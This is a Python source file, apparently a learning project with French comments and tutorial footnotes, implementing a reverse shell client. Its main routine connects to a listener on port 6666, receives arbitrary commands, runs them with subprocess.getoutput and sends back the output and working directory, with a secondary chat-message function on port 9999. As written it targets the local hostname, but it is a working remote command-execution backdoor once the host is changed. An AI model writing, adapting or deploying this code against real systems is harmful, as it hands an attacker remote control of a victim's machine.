#!/usr/bin/env python
# coding=utf-8


__author__ = 'Karl Boulais'

import socket
import os
import subprocess
import sys
import json


class Client():
    def __init__(self):
        pass

    def _sending(self, s, data):
        return s.send(bytes(json.dumps(data), "UTF-8"))
         
    
    def _receiving(self, s):
        data = ""
        while True:
            try:
                data += s.recv(1024).decode("UTF-8").strip()
                return json.loads(data)
            except ValueError:
                continue
        

    def sendingData(self):
        s = socket.socket()
        ip = socket.gethostname()
        host = ip
        port = 9999
        quitting = False
        s.connect((host, port))
        data = {}

        # TODO envoi les données du système changer la fonction
        while True:
            data["message"] = input('> ')
            if data["message"].lower() == "exit":
                self._sending(s, data)
                s.close
                break

            self._sending(s, data)

    
    def sendingReverseShell(self):
        s = socket.socket()
        ip = socket.gethostname()
        host = ip
        port = 6666
        quitting = False
        s.connect((host, port))
    
        data = {}

        while not quitting:
            data["cwd"] = os.getcwd()

            self._sending(s, data)

            # Waiting for a command
            data = self._receiving(s)
            commandArgs = data["command"].split()

            if data["command"].lower() == "exit":
                quitting = True
                self._sending(s, data)
                s.close()
            if commandArgs[0].lower() == "cd":
                try:
                    os.chdir(' '.join(commandArgs[1:]))
                except Exception as e:
                    if e == FileNotFoundError: 
                        data["output"] = str(e)
                    else:
                        data["output"] = ""
            else:
                data["output"] = subprocess.getoutput(data["command"])
            

    def main(self):
        # [1]_ [2]_
        self.sendingReverseShell()

if __name__ == "__main__":
   Client().main()


'''
.. rubric:: Notes de bas de page

.. [1]  https://www.tutorialspoint.com/python_network_programming/python_sockets_programming.htm 
        Principe de base d'une connexion TCP avec le module socket
.. [2]  https://gist.github.com/Integralist/3f004c3594bbf8431c15ed6db15809ae
        Utilisation de thread pour prendre en charge plusieurs connexions client à la fois
'''